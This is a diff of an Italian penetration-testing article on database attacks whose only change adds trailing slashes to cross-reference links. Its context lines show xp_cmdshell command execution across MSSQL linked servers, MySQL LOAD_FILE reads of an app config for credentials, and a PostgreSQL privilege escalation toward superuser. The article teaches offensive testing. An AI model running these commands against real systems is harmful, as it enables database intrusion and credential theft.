@@ -40,7 +40,7 @@ Esecuzione comandi OS tramite funzionalità del DB
 RCE → shell → post-exploitation
 ```
 
-Vedi anche: [sql-injection](https://hackita.it/articoli/sql-injection), [rce](https://hackita.it/articoli/rce), [database-security](https://hackita.it/articoli/database-security), [lateral-movement](https://hackita.it/articoli/lateral-movement), [credential-dumping](https://hackita.it/articoli/credential-dumping).
+Vedi anche: [sql-injection](https://hackita.it/articoli/sql-injection/), [rce](https://hackita.it/articoli/rce/), [database-security](https://hackita.it/articoli/database-security/), [lateral-movement](https://hackita.it/articoli/lateral-movement/), [credential-dumping](https://hackita.it/articoli/credential-dumping/).
 
 ***
 
@@ -245,7 +245,7 @@ EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer];
 EXEC ('EXEC (''EXEC xp_cmdshell ''''whoami'''''') AT [Server3]') AT [Server2];
 ```
 
-→ Vedi anche: [porta-1433-mssql](https://hackita.it/articoli/porta-1433-mssql)
+→ Vedi anche: [porta-1433-mssql](https://hackita.it/articoli/porta-1433-mssql/)
 
 ***
 
@@ -325,7 +325,7 @@ SELECT LOAD_FILE('/var/www/html/config.php');  -- config dell'app → credenzial
 SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');  -- Windows
 ```
 
-→ Vedi anche: [porta-3306-mysql](https://hackita.it/articoli/porta-3306-mysql)
+→ Vedi anche: [porta-3306-mysql](https://hackita.it/articoli/porta-3306-mysql/)
 
 ***
 
@@ -381,7 +381,7 @@ WHERE prosecdef = true;
 -- → esegui la funzione con payload SQLi → scala a superuser
 ```
 
-→ Vedi anche: [porta-5432-postgresql](https://hackita.it/articoli/porta-5432-postgresql)
+→ Vedi anche: [porta-5432-postgresql](https://hackita.it/articoli/porta-5432-postgresql/)
 
 ***
 
@@ -536,7 +536,7 @@ xp_cmdshell "C:\Temp\ps.exe -i -c cmd"
 # → shell come NT AUTHORITY\SYSTEM
 ```
 
-→ Vedi anche: [seimpersonateprivilege](https://hackita.it/articoli/seimpersonateprivilege), [privilege-escalation-windows](https://hackita.it/articoli/privilege-escalation-windows)
+→ Vedi anche: [seimpersonateprivilege](https://hackita.it/articoli/seimpersonateprivilege/), [privilege-escalation-windows](https://hackita.it/articoli/privilege-escalation-windows/)
 
 ### MySQL/PostgreSQL → Root via Misconfiguration
 
